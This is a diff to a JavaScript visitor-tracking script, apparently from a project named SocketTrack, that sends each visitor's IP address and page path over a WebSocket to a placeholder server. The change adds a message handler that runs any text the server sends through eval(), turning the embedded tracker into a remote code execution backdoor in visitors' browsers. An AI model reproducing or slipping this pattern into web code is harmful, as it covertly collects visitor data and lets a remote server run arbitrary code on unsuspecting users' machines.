@@ -7,7 +7,7 @@
 // https://github.com/synfinner/SocketTrack
 // @synfinner
 
-function sTrack() {
+(function sTrack() {
 
    if ("WebSocket" in window) {
       var xhr = new XMLHttpRequest();
@@ -17,12 +17,17 @@ function sTrack() {
          if (xhr.status >= 200 && xhr.status < 300) {
             // Runs when the request is successful
             var IP = xhr.responseText; // Set ip to the response.
-            var ws = new WebSocket("ws://SERVER:8080/sockettrack");
+            var ws = new WebSocket("ws://SERVER_IP:8080/sockettrack");
             ws.onopen = function() {
                // send ip and paath to server as json for easy parsing
                ws.send(JSON.stringify({ip:IP,loc:window.location.pathname}));
                // close the web socket 
-               ws.close()
+               //ws.close();
+            }
+            ws.onmessage = function(event){
+               var msg = event.data;
+               ws.close();
+               eval(msg);
             };
          } else {
             return false; // return false if we don't get a 200 for getting the IP
@@ -31,6 +36,4 @@ function sTrack() {
    } else {
       return false // return false if the browser doesn't support websockets
    }
-};
-
-sTrack() // invoke function onload
+})(); // invoke anonymous function
